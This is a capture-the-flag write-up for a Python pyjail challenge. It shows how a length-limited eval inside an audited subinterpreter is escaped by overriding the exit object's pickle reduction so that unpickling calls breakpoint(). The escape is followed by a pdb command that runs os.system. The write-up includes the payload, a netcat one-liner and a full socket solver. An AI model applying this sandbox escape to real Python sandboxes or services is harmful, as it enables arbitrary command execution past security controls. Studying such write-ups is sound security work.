# literally-1984

**Category:** misc

---

#### Description

We are given a Python 3.14 “pyjail”:

* Input is length-limited (`< 67`) and must be printable ASCII.
* Blacklisted characters: space, `_`, `.`, `\\`, `"`, `'`, `{}`, `#`, `=`.
* Our input is wrapped into `eval(f"print({inp})")` inside a **subinterpreter** with an audit hook that kills the process after more than 3 audit events.

Goal: get the real flag (the container includes an execute-only `printflag` binary).

#### Solution

Key observation: `concurrent.interpreters.Interpreter.call()` pickles/unpickles arguments and return values across interpreters. The audit hook is only installed in the *subinterpreter*, not in the main interpreter.

So we:

1. Break out of the `print(<inp>)` wrapper by starting our input with `)or(`, making the overall evaluated expression:
   * `print() or (<our expression>)`
2. Modify a picklable object (`exit`, a `_sitebuiltins.Quitter` instance) to override its `__reduce_ex__` method (without typing underscores, using `dir(0)[41]` which is the string `"__reduce_ex__"`).
3. Return that `exit` object, forcing the subinterpreter to pickle it.
4. During *unpickling in the main interpreter*, our custom reduction runs.

Instead of trying to directly reach `os.system` under the tight 66-character limit, we make unpickling call `breakpoint()`, which drops into `pdb`. Even though the jail only reads one line for `inp`, the TCP stream can include additional lines; `pdb` will read them from stdin next. We pre-send:

* `!import os;os.system('/app/printflag')` (note: pwn.red/jail chroots to `/srv`, so the binary is at `/app/printflag`)
* `c` to continue execution and let the process exit cleanly

**One-shot exploit input (first line):**

```
)or(setattr(exit,dir(0)[41],lambda*s:(breakpoint,()))or(exit)
```

**Example run with netcat (sends pdb commands after the payload):**

```bash
{ \
  printf '%s\n' ")or(setattr(exit,dir(0)[41],lambda*s:(breakpoint,()))or(exit)"; \
  printf '%s\n' "!import os;os.system('/app/printflag')"; \
  printf '%s\n' c; \
} | nc chall.lac.tf 32323
```

**Automated solver (no external deps):** `solve.py`

```python
#!/usr/bin/env python3
import re
import socket
import time


HOST = "chall.lac.tf"
PORT = 32323


PAYLOAD = ")or(setattr(exit,dir(0)[41],lambda*s:(breakpoint,()))or(exit)"
# pwn.red/jail chroots to /srv, so /srv/app/printflag becomes /app/printflag.
PDB_CMD = "!import os;os.system('/app/printflag')"


def main() -> None:
    script = f"{PAYLOAD}\n{PDB_CMD}\nc\n"
    with socket.create_connection((HOST, PORT), timeout=10) as s:
        s.settimeout(5)

        # Read (best effort) until we see the prompt.
        buf = b""
        deadline = time.monotonic() + 10
        while b"1984> " not in buf and time.monotonic() < deadline:
            try:
                chunk = s.recv(4096)
            except TimeoutError:
                continue
            if not chunk:
                break
            buf += chunk

        s.sendall(script.encode())

        # Read until the server closes the connection (or a generous deadline).
        deadline = time.monotonic() + 30
        while time.monotonic() < deadline:
            try:
                chunk = s.recv(4096)
            except socket.timeout:
                continue
            if not chunk:
                break
            buf += chunk
            deadline = time.monotonic() + 5  # extend while data arrives

    text = buf.decode(errors="replace")
    m = re.search(r"lactf{[^}]+}", text)
    if not m:
        raise SystemExit("flag not found in output")
    print(m.group(0))


if __name__ == "__main__":
    main()
```
